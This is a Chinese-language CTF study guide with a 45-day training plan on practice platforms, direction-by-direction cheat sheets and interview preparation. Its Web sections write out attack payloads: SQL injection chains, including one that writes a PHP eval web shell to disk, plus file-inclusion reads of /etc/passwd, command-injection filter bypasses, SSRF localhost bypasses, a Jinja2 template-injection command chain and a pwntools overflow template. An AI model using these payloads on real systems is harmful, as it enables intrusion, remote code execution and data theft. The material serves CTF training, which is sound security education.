# CTF 完整学习指南（整合版）

> **📘 文档定位**：CTF 竞赛从入门到精通 | 总学时：80小时+
> 
> 核心方法论："3次击穿法"——每类漏洞必须经历"看教程抄Payload → 开环境打题 → 关笔记默写"三个循环

---

## 📋 导航目录

- [一、CTF 概述与学习路线](#一ctf-概述与学习路线)
- [二、环境准备（第0天）](#二环境准备第0天)
- [三、六大周学习计划](#三六大周学习计划)
- [四、五大方向详解](#四五大方向详解)
- [五、高频考点速查](#五高频考点速查)
- [六、工具与资源](#六工具与资源)
- [七、卡住急救总纲](#七卡住急救总纲)

---

## 一、CTF 概述与学习路线

### 1.1 什么是 CTF

```
CTF (Capture The Flag) = 夺旗赛

核心理念：在模拟环境中解决安全挑战，获取"Flag"作为解题凭证
Flag格式：flag{xxx} 或 FLAG{xxx}
```

### 1.2 三大赛制

| 赛制 | 模式 | 特点 | 适用场景 |
|:---|:---|:---|:---|
| **Jeopardy（解题模式）** | 各方向独立解题，提交 Flag 得分 | 最常见，门槛低 | 国内 CTF 主流 |
| **AWD（攻防模式）** | 每队维护服务器，攻击别人 + 修补自己 | 对抗性强 | 护网风格，实战模拟 |
| **King of the Hill** | 抢占并维护"山头"，持续控制得分 | 持久对抗 | 高级别赛事 |

### 1.3 CTF 五大方向对比

| 方向 | 英文名 | 核心内容 | 难度入门级 | 工具依赖度 |
|:---|:---|:---|:---:|:---:|
| Web | Web Security | Web 安全漏洞利用 | ⭐⭐ | 中 |
| Pwn | Binary Exploitation | 二进制漏洞利用（溢出/堆/格式化字符串） | ⭐⭐⭐⭐ | 高 |
| Reverse | Reverse Engineering | 逆向工程（脱壳/算法/混淆） | ⭐⭐⭐ | 高 |
| Crypto | Cryptography | 密码学（加解密/数学） | ⭐⭐⭐ | 中 |
| Misc | Miscellaneous | 杂项（隐写/取证/流量分析） | ⭐⭐ | 中 |

### 1.4 三阶段学习路径

```
Phase 1 (1-2月): 基础 + 各方向入门
  → Linux 命令、Python 脚本、网络基础
  → 每个方向做 20 道入门题
  → 确定 1-2 个主方向

Phase 2 (3-6月): 主方向深入
  → 主方向刷 100+ 题
  → 参加线上赛(CTFtime)
  → 赛后复现 + 写 WP

Phase 3 (6-12月): 战队 + 进阶
  → 加入战队、稳定参赛
  → 学习高级技术
  → 出题/分享
```

---

## 二、环境准备（第0天）

### 2.1 必备工具清单

| 工具 | 作用 | 安装/配置指令 |
|:---|:---|:---|
| **Burp Suite Community** | 抓包改包 | 官网下载，浏览器代理设为 `127.0.0.1:8080` |
| **Python 3** | 写爆破脚本 | 官网下载，安装时勾选"Add to PATH" |
| **010 Editor** | 十六进制改文件头 | 下载试用版即可 |
| **Wireshark** | 分析流量包 | 安装时勾选"Npcap"组件 |
| **StegSolve** | 图片LSB隐写 | 下载jar包，双击运行（需Java环境） |
| **Chrome/Firefox** | 浏览器 | 必须装SwitchyOmega插件，一键切换Burp代理 |

### 2.2 Pwn/Reverse 工具

```bash
# Linux 环境 (推荐 WSL2 或 Kali)
sudo apt install gdb python3 python3-pip
pip3 install pwntools

# GDB 插件
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# ROPgadget
pip3 install ROPgadget

# checksec (pwntools自带)
checksec ./pwn
```

### 2.3 验收标准

```
✅ Burp能抓到百度首页的HTTPS包（能看到乱码变明文）
✅ Python能运行 print("Hello CTF")
✅ Wireshark能打开pcap文件
✅ 010 Editor能打开并编辑二进制文件
```

---

## 三、六大周学习计划

### 📅 第一周：浏览器F12裸奔训练（Day 1-7）

**本周目标**：禁用Burp，仅靠浏览器开发者工具解出CTFHub"HTTP协议"全模块

#### Day 1：F12网络面板深度拆解
```
动作：打开CTFHub「HTTP协议-请求方法」
      F12→网络，勾选"保留日志"
      刷新，点击第一个请求，看"标头"里的Request Method和Status Code

输出：截图请求头，标注出Host、User-Agent、Referer三个字段
```

#### Day 2：GET与POST手搓战
```
动作：F12→网络→找到请求右键→"以Fetch方式重新发送"
      把GET改成POST，加body参数
      完成CTFHub「POST请求」

输出：记录 curl -X POST -d "key=value" URL 这条命令
```

#### Day 3：Cookie越权
```
动作：F12→应用（Application）→存储→Cookie
      双击修改值
      CTFHub「Cookie」题，把admin=0改成admin=1

卡住急救：改完没反应？清空浏览器缓存（Ctrl+Shift+Del）再试
```

#### Day 4：状态码与跳转
```
动作：CTFHub「302跳转」
      F12必须勾选"保留日志"，否则跳转后包就没了
      在响应头里找Location字段拿Flag

输出：抄下常见状态码含义（200/302/403/404/500）
```

#### Day 5：UA伪装与Referer防盗链
```
动作：CTFHub「User-Agent」，把UA改成iPhone的
      「Referer」题，把来源改成www.google.com

输出：保存两个常用UA（PC和手机）到笔记
```

#### Day 6（周末）：CTFHub HTTP协议模块清关
```
动作：重做该模块全部8道题，要求每题5分钟内完成
      超时的题标记为"红牌"，晚上专门复盘

输出：整理"F12修改请求头的5种姿势"思维导图
```

#### Day 7（周末）：休息+预习
```
动作：不敲代码，去B站搜"Burp Suite入门教程"
      看前30分钟，了解Proxy和Repeater长什么样
```

---

### 📅 第二周：Burp肌肉记忆（Day 8-14）

**本周目标**：Burp操作达到"盲打"水平

#### Day 8：Proxy抓包与CA证书
```
动作：配置SwitchyOmega代理
      抓百度，若出现"证书无效"，按Burp内置CA证书导入流程

卡住急救：抓不到HTTPS？一定是证书没装好，这是本周唯一可能劝退的点
```

#### Day 9：Repeater核心操作
```
动作：随便抓一个GET包，右键→Send to Repeater
      修改URL里的参数，点Go，看响应变化

输出：截一张Repeater界面的图，标注"请求区"和"响应区"
```

#### Day 10：Decoder解码器三板斧
```
动作：找一道"先Base64再URL编码"的题
      把密文贴进Decoder，先点"Decode as URL"，再点"Decode as Base64"

输出：总结"看到%先URL解，看到末尾=先Base64解"的铁律
```

#### Day 11：Intruder爆破器
```
动作：CTFHub「基础认证」
      发送到Intruder，选Sniper模式
      加载Burp自带的字典

卡住急救：爆破完没找到正确密码？看响应包长度排序
```

#### Day 12：Burp组合拳训练
```
动作：找一道需要"抓包→改Cookie→重放"的混合题
      全程只用Burp，不切浏览器

输出：记录自己的操作路径
```

#### Day 13（周末）：Burp专项闯关
```
动作：去Bugku CTF"Web"新手区，挑3道题
      强制全程用Burp，禁止用F12

输出：整理Burp常用快捷键（Ctrl+I送Intruder，Ctrl+R送Repeater）
```

#### Day 14（周末）：第一、二周总复盘
```
动作：白纸默写Burp四个核心模块的图标颜色和用途
      默不出，下周每天加练10分钟
```

---

### 📅 第三周：SQL注入攻坚战（Day 15-22）

**本周目标**：彻底吃透数字型、字符型、报错注入、布尔盲注。不碰sqlmap，纯手注

#### Day 15：数字型与闭合方式
```
动作：CTFHub「整数型注入」
      输入?id=1'看报错
      再输入?id=1 and 1=1和?id=1 and 1=2对比回显

核心指令：admin' or 1=1#（注意#要URL编码为%23）

输出：笔记写下"数字型不需要引号，字符型需要单引号闭合"
```

#### Day 16：order by判列数
```
动作：输入?id=1 order by 1一直试到order by 5报错
      说明列数是4

卡住急救：如果order by被过滤，试试group by
```

#### Day 17：union select联合查询
```
动作：构造?id=-1 union select 1,2,3,4
      看回显的2和3位置，这是你的"数据出口"

输出：截图标注回显位置
```

#### Day 18：information_schema实战
```
动作：查库名
      UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata

硬指标：今天必须拿到当前数据库名，否则Day19重来
```

#### Day 19：爆表名和字段名
```
动作：UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='库名'

输出：把查表名和字段名的两条语句抄写5遍，形成肌肉记忆
```

#### Day 20：报错注入
```
动作：利用updatexml(1,concat(0x7e,(select database()),0x7e),1)报错出数据库名

卡住急救：updatexml长度有限制，记得用substr截断

输出：记录0x7e是~的十六进制，用来标记边界
```

#### Day 21（周末）：盲注突破
```
动作：CTFHub「布尔盲注」看Length列判断真假
      「时间盲注」用sleep(5)配合if

输出：整理"盲注三件套"——length()、substr()、ascii()
```

#### Day 22（周末）：第三周复盘
```
动作：关掉所有笔记，在记事本里敲出完整的一条SQL注入链
      敲不出来，下周继续练，不往后走
```

---

### 📅 第四周：文件包含+命令执行+Misc入门（Day 23-30）

**本周目标**：拿下LFI/RCE的5个高频Payload，同时Misc开始赚外快

#### Day 23：LFI本地包含
```
动作：CTFHub「文件包含」
      输入?file=../../../../etc/passwd

核心指令：php://filter/convert.base64-encode/resource=index.php（必背！）
```

#### Day 24：伪协议进阶
```
动作：data://text/plain,<?php system('ls');?>

输出：笔记归档"文件包含5大伪协议"（file、php、data、zip、http）
```

#### Day 25：路径绕过与编码绕过
```
动作：遇到过滤../，试....//、..././，或URL编码%2e%2e%2f
```

#### Day 26：命令执行入门
```
动作：CTFHub「命令注入」
      输入127.0.0.1; ls 和 127.0.0.1; cat flag

卡住急救：分不清|和||？记口诀："一个竖线只管传，两个竖线前面错才管"
```

#### Day 27：RCE空格与黑名单绕过
```
动作：空格用$IFS$9替换
      黑名单用a=fl;b=ag; cat $a$b变量拼接

输出：整理"命令执行绕过8法"速查表
```

#### Day 28：Misc文件头修复
```
动作：下载一个PNG图片，用010 Editor打开
      把前4字节改成89 50 4E 47

输出：记录常见文件头（JPEG=FF D8 FF，ZIP=50 4B 03 04）
```

#### Day 29（周末）：流量包分析
```
动作：Wireshark打开pcap
      右键"追踪流"→"TCP流"
      在HEX+ASCII视图里搜flag

输出：完成CTFHub「流量分析」2题
```

#### Day 30（周末）：第四周总复盘
```
动作：把文件包含和命令执行的Payload做成实体小卡片
      随身背
```

---

### 📅 第五周：攻防世界闯关（Day 31-36）

**本周目标**：从"练习模式"切换到"比赛模式"

#### Day 31-32：攻防世界Web新手区
```
规则：每题限时20分钟，超时直接看官方WriteUp
重点：练习用dirsearch扫隐藏目录（如/flag、/backup、/www.zip）
输出：抄下WriteUp里的Payload，标注"我卡在了哪一步"
```

#### Day 33-34：攻防世界Misc新手区
```
重点：LSB隐写用StegSolve的"Data Extract"提取
      音频隐写看频谱图（Audacity）
```

#### Day 35-36（周末）：新手区全量通关
```
动作：把该区所有Web+Misc题再过一遍
      统计独立完成率，如果低于50%，原地补课
```

---

### 📅 第六周：模拟赛+毕业答辩（Day 37-40）

**本周目标**：全真模拟，验收80小时成果

#### Day 37-38：BUUCTF随机题目
```
规则：允许百度语法，不允许搜WriteUp
      Web简单题3道 + Misc简单题3道
      限时2小时
```

#### Day 39：全真模拟赛（毕业考）
```
动作：打开攻防世界"新手练习场"
      随机抽Web×4 + Misc×3
      4小时倒计时（模拟真实比赛）
      开Burp，开百度，严禁看WriteUp

验收：能做对 ≥ 4题（60%），颁发给自己"黄金段位"结业证
```

#### Day 40：终极复盘与出征
```
白纸默写：
  ✅ SQL查库语句
  ✅ 文件包含伪协议
  ✅ 命令执行空格绕过
  ✅ LSB提取命令
  ✅ Burp爆破配置

错题重做：选40天里标记"红牌"的5道错题，再做一遍

最后一步：登录"CTFshow"或"Bugku"，报名最近一场周赛
```

---

### 📅 第七周：面试实战冲刺（Day 41-45）

**本周目标**：从CTF选手转变为面试候选人，掌握面试技巧

#### Day 41：全真模拟面试（一）
```
主题：自我介绍·技术问答·场景设计

动作：
  1. 准备3分钟自我介绍（突出CTF经历）
  2. 模拟回答10道技术问题：
     - 你参加过哪些CTF比赛？
     - CTF中你最擅长什么方向？
     - 讲一个你印象最深的CTF题目
     - CTF经历对你的安全能力有什么帮助？
     - 你如何学习CTF？
  3. 场景设计题：如果让你设计一道SQL注入题目，你会怎么设计？

输出：录制自己的回答视频，回看改进
```

#### Day 42：全真模拟面试（二）
```
主题：项目深挖·技术广度·反向提问

动作：
  1. 项目深挖：
     - 详细描述一个CTF题目的完整解题过程
     - 遇到的困难和如何解决
     - 赛后如何复盘和学习
  2. 技术广度问题：
     - CTF和渗透测试有什么区别？
     - 你有什么CTF相关的项目或作品？
     - 你未来在CTF方面有什么计划？
  3. 准备3个反向提问（问面试官）

输出：整理"项目经历话术库"
```

#### Day 43：CTF面试避坑指南
```
主题：常见错误·避雷策略·加分项

常见错误：
  ❌ 只说比赛名称，不说具体贡献
  ❌ 题目讲不清楚解题思路
  ❌ 过度夸大自己的能力
  ❌ 对不会的问题直接说"不知道"

避雷策略：
  ✅ 用STAR法则描述题目（情境-任务-行动-结果）
  ✅ 诚实承认不会，但展示学习能力
  ✅ 准备具体的数据和案例

加分项：
  ⭐ 有自己的技术博客/WriteUp
  ⭐ GitHub上有CTF工具或脚本
  ⭐ 参加过大型比赛并有名次
  ⭐ 有团队协作经验

输出：整理"避坑清单"贴在墙上
```

#### Day 44：CTF面试冲刺
```
主题：3天冲刺计划·最后查漏补缺

冲刺清单：
  □ 复习所有SQL注入Payload（手写5遍）
  □ 复习Pwn的ROP链构造
  □ 复习Crypto的RSA攻击类型
  □ 复习Misc的隐写术方法
  □ 准备5个"印象最深的题目"故事
  □ 准备3个"遇到的困难"故事
  □ 准备3个"团队协作"故事

模拟面试：
  找朋友或同学进行1次全真模拟面试
  时长：30分钟
  录音录像，事后复盘

输出：完成"冲刺清单"所有项目
```

#### Day 45：CTF面试总结与展望
```
主题：总结·评估·规划·行动

总结：
  ✅ 回顾45天学习历程
  ✅ 统计刷题数量和掌握的技能
  ✅ 整理个人"CTF能力雷达图"

评估：
  - Web方向：⭐⭐⭐⭐⭐（自评）
  - Pwn方向：⭐⭐⭐（自评）
  - Crypto方向：⭐⭐⭐（自评）
  - Reverse方向：⭐⭐⭐（自评）
  - Misc方向：⭐⭐⭐⭐（自评）

规划：
  - 短期目标（1个月）：参加X场比赛，刷Y道题
  - 中期目标（3个月）：掌握Z技术，达到XX水平
  - 长期目标（1年）：加入战队，参加高级别比赛

行动：
  📅 报名下一场CTF比赛
  📅 每周至少刷5道题保持手感
  📅 每月写1篇WriteUp
  📅 加入一个CTF战队或社群

最终交付：
  ✅ 个人CTF简历
  ✅ 技术博客/GitHub仓库
  ✅ 45天学习笔记
  ✅ 错题复盘文档
```

---

## 四、五大方向详解

### 4.1 Web 方向

#### 技能体系

```
Web 安全技能树：

基础层：HTTP 协议、Cookie/Session、HTML/JS/PHP 基础
注入层：SQL 注入、命令注入、XSS、文件上传、文件包含
进阶层：反序列化（PHP/Java）、SSRF、XXE、SSTI
高级层：JWT、OAuth、GraphQL 安全、原型链污染
```

#### SQL注入速查

```sql
-- 1. 判断列数
ORDER BY 3 -- 

-- 2. 查数据库
UNION SELECT 1,database(),3 -- 

-- 3. 查表名
UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- 

-- 4. 查列名
UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='表名' -- 

-- 5. 盲注
AND (SELECT ascii(substr(database(),1,1)))>100 -- 

-- 6. 写文件GetShell
UNION SELECT 1,'<?php eval($_POST[1]);?>',3 INTO OUTFILE '/var/www/html/shell.php' -- 
```

#### SSRF IP绕过

```bash
http://127.0.0.1/flag     → 过滤了！
http://0177.0.0.1/flag    → 八进制绕过 ✓
http://2130706433/flag     → 十进制绕过 ✓
http://0x7f000001/flag     → 十六进制绕过 ✓
http://127.0.0.1.xip.io/flag → DNS绕过 ✓
```

#### SSTI模板注入

```python
# Flask/Jinja2 SSTI
{{7*7}}  # → 49 → SSTI 确认

# RCE 链
{{''.__class__.__mro__[1].__subclasses__()}}
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
```

---

### 4.2 Pwn 方向

#### 技能体系

```
Pwn 技能树：

前置知识：C 语言、汇编（x86/x64）、Linux 基础
基础漏洞：栈溢出（Stack Overflow）、Canary 绕过
核心技能：ROP（Return-Oriented Programming）、格式化字符串漏洞
高级技能：Heap 利用（Use-After-Free、Fastbin、Tcache）
```

#### checksec 保护解读

```bash
checksec ./pwn

# 输出解读:
# Arch:     amd64-64-little    → 64位架构
# RELRO:    Full RELRO         → GOT表只读
# Stack:    Canary found       → 栈保护(需绕过)
# NX:       NX enabled         → 栈不可执行(ROP替代Shellcode)
# PIE:      PIE enabled        → 地址随机化(需泄露基址)
```

#### pwntools 模板

```python
from pwn import *

# 连接
io = remote('ctf.example.com', 10001)
# io = process('./pwn')

elf = ELF('./pwn')
rop = ROP(elf)

# 找gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 构造Payload
offset = 40
payload = b'A' * offset
payload += p64(ret)           # 栈对齐
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)    # 参数
payload += p64(elf.sym['win'])

io.sendline(payload)
io.interactive()
```

---

### 4.3 Reverse 方向

#### 技能与工具

```
Reverse 技能树：

基础：汇编（x86/x64）、C/C++ 阅读能力
静态分析：IDA Pro（F5 反编译）/ Ghidra（免费替代）
动态调试：x64dbg（Windows）/ GDB + pwndbg（Linux）
进阶：加密算法识别、反混淆/脱壳
```

#### 逆向三步走

```bash
# 1. file 查类型
file crackme.exe

# 2. strings 找线索
strings crackme.exe | grep -i flag

# 3. IDA 反编译分析逻辑
# 打开IDA → F5反编译 → 分析关键函数
```

---

### 4.4 Crypto 方向

#### RSA 攻击矩阵

| 条件 | 攻击方法 | 工具 |
|:---|:---|:---|
| n可分解 | 分解n→p,q→解密 | factordb/yafu |
| e=3且m³<n | 小e攻击: c开3次方 | Python gmpy2 |
| 同一m,不同e | 共模攻击 | Python |
| e很大,d很小 | Wiener攻击 | RsaCtfTool |
| p,q相近 | Fermat分解 | RsaCtfTool |

#### RSA解密脚本

```python
from Crypto.Util.number import *

# 基础RSA解密
c = 111111
e = 65537
p = 123456789
q = 987654321
n = p * q
phi = (p-1) * (q-1)
d = invert(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

---

### 4.5 Misc 方向

#### 五大子领域

```
图片隐写:
  steghide extract -sf image.jpg
  zsteg image.png
  binwalk -e image.jpg

流量分析:
  Wireshark → Follow TCP Stream
  tshark -r capture.pcap -Y "http"

压缩包:
  fcrackzip -b -u -c a -l 1-6 flag.zip

取证:
  volatility -f memory.dump imageinfo
  foremost -i disk.img -o output/
```

#### 常见文件头

| 文件类型 | 文件头（Hex） |
|:---|:---|
| PNG | 89 50 4E 47 |
| JPEG | FF D8 FF |
| GIF | 47 49 46 38 |
| ZIP | 50 4B 03 04 |
| PDF | 25 50 44 46 |

---

## 五、高频考点速查

### 5.1 高分考点速查表

| 序号 | 考点 | 频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | CTF 三大赛制 | ⭐⭐⭐ | ⭐ | Jeopardy/AWD/King of the Hill |
| 2 | 五大方向划分 | ⭐⭐⭐ | ⭐ | Web/Pwn/Reverse/Crypto/Misc |
| 3 | PHP 弱类型比较 | ⭐⭐⭐⭐ | ⭐⭐ | 0e 开头 MD5 松散比较 |
| 4 | SQL 注入基础 | ⭐⭐⭐⭐ | ⭐⭐ | UNION SELECT + information_schema |
| 5 | checksec 保护解读 | ⭐⭐⭐ | ⭐⭐⭐ | Canary/NX/PIE/RELRO |
| 6 | RSA 基本攻击 | ⭐⭐⭐⭐ | ⭐⭐⭐ | 分解/小e/共模/Wiener |
| 7 | SSRF IP 绕过 | ⭐⭐⭐⭐ | ⭐⭐ | 八进/十进/十六进/DNS |
| 8 | PHP 反序列化 POP 链 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 找入口→跳板→终点 |

### 5.2 知识巧记口诀

> 🎵 **CTF入门口诀**：
> CTF 入门要记牢，五大方向不能少。
> Web 漏洞先学好，Pwn 要汇编基础牢。
> Reverse 逆向耐心找，Crypto 数学不能少。
> Misc 隐写工具多，三阶段学习步步高。

> 🎵 **SQL注入口诀**：
> SQL 注入查表名，information_schema行。
> Union查询先判列，盲注三件套要记清。

> 🎵 **SSRF绕过口诀**：
> SSRF 绕过用八进，十进十六进也行。
> DNS重绑和302，gopher协议最要命。

---

## 六、工具与资源

### 6.1 推荐平台

| 平台 | 类型 | 特点 |
|:---|:---|:---|
| CTFtime.org | 全球 CTF 日历 | 赛程追踪、队伍排名 |
| CTFHub | 国内练习 | 分类清晰、在线环境 |
| BUUCTF | 国内练习 | 历年真题复现 |
| NSSCTF | 国内练习 | 新题更新快 |
| 攻防世界 | 国内练习 | 新手友好 |
| pwnable.kr | Pwn练习 | 经典Pwn题目 |
| CryptoHack | Crypto练习 | 交互式学习 |

### 6.2 常用工具

```bash
# Web
Burp Suite、sqlmap、dirsearch、ffuf

# Pwn/Reverse
pwntools、ROPgadget、IDA Pro、Ghidra、GDB+pwndbg

# Crypto
RsaCtfTool、SageMath、CyberChef、z3

# Misc
Wireshark、binwalk、steghide、StegSolve、010 Editor
```

---

## 七、卡住急救总纲

| 卡住场景 | 立即执行 |
|:---|:---|
| Burp抓不到包 | 检查代理端口（8080），检查SwitchyOmega是否切到代理模式 |
| SQL注入无回显 | 试时间盲注sleep(5)，看浏览器转圈圈 |
| 文件包含读不到文件 | 试php://filter读源码，不要直接读.txt |
| 命令执行没输出 | 试;ls /或\|\|ls，确认是哪种管道符 |
| Misc图片打不开 | 010 Editor看文件头，缺啥补啥 |
| RSA解不出来 | 先去factordb.com分解n |
| 心态彻底爆炸 | 今天关机，去B站看"CTF比赛精彩集锦"，找回初心 |

---

## 📝 每日三行复盘（强制执行）

每天睡前，不管多晚，在笔记里写：

```
今日战果：解出__道题，学会__新Payload。

今日踩坑：______（例如：忘了URL编码#号）。

明日攻坚：______（例如：必须搞懂布尔盲注的Length列）。
```

---

## ✅ 安全部署 Checklist

- [ ] Linux/Python/Git 基础环境搭建
- [ ] Burp Suite + CA证书配置完成
- [ ] 各方向入门题各 20 道
- [ ] pwntools/IDA/Ghidra 熟练使用
- [ ] CTFtime 注册并关注赛事
- [ ] 参加至少 1 场线上赛
- [ ] 赛后复现并撰写 WP
- [ ] 建立个人工具库和脚本库

---

**最终交付物**：你自己的"CTF速查笔记本"（推荐Notion或本地Markdown），包含50+条Payload和20道典型错题复盘。
